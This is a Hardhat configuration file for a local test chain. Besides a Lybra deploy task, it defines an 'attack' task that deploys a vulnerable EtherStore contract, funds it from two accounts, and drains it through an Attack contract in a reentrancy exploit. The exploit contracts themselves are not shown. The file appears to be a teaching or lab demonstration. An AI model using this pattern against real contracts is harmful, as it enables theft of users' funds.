import { HardhatUserConfig, task } from "hardhat/config";
import "@nomicfoundation/hardhat-toolbox";
import "@nomiclabs/hardhat-web3";

task(
  "deploy",
  "deploys the contracts and prepares initial transactions",
  async (taskArgs, hre) => {
    const LYBRA = await hre.ethers.getContractFactory("Lybra");
    const lybra = await LYBRA.deploy();
    await lybra.deployed();

    const accounts = await hre.ethers.getSigners();

    let user = accounts[0];
  }
);

task(
  "attack",
  "try reentrancy attack on a vulnerable contract",
  async (taskArgs, hre) => {
    const accounts = await hre.ethers.getSigners();

    const user1 = accounts[1];
    const user2 = accounts[2];

    console.log(
      "before wallet balance: ",
      hre.ethers.utils.formatEther(await accounts[0].getBalance())
    );

    const EtherStore = await hre.ethers.getContractFactory("EtherStore");
    const etherStore = await EtherStore.deploy();
    await etherStore.deployed();

    const Attack = await hre.ethers.getContractFactory("Attack");
    const attack = await Attack.deploy(etherStore.address);
    await attack.deployed();

    const tx1 = await etherStore.connect(user1)["deposit"]({
      value: hre.ethers.utils.parseEther("2.0"),
    });

    await tx1.wait();

    const tx2 = await etherStore.connect(user2)["deposit"]({
      value: hre.ethers.utils.parseEther("2.0"),
    });

    await tx2.wait();

    const tx = await attack["attack"]({
      value: hre.ethers.utils.parseEther("2.0"),
    });

    await tx.wait();

    console.log(
      "Final Attack balance: ",
      hre.ethers.utils.formatEther(
        await hre.ethers.provider.getBalance(attack.address)
      )
    );
  }
);

const config: HardhatUserConfig = {
  solidity: "0.8.18",
  networks: {
    hardhat: {
      chainId: 1337,
    },
  },
};

export default config;
